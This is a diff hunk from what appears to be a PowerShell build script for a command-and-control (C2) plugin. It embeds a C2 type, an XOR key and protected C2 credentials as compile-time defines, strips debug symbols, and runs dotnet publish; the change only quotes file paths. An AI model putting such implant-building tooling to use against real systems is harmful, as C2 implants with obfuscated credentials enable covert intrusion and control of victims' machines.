@@ -368,7 +368,7 @@ $c2Defines = "C2_TYPE_$C2_TYPE;C2_KEY=$XOR_KEY"
 if ($C2_CRED1_PROT) { $c2Defines += ";C2_VAL1=$C2_CRED1_PROT" }
 if ($C2_CRED2_PROT) { $c2Defines += ";C2_VAL2=$C2_CRED2_PROT" }
 
-$publishCommand = "dotnet publish $PluginProj -c Release -o $DistDir /p:PublishSingleFile=true /p:SelfContained=false /p:DebugType=None /p:DebugSymbols=false /p:DefineConstants=`"$c2Defines`" > $buildLog 2>&1"
+$publishCommand = "dotnet publish `"$PluginProj`" -c Release -o `"$DistDir`" /p:PublishSingleFile=true /p:SelfContained=false /p:DebugType=None /p:DebugSymbols=false /p:DefineConstants=`"$c2Defines`" > `"$buildLog`" 2>&1"
 Invoke-Expression $publishCommand
 
 if ($LASTEXITCODE -eq 0) {
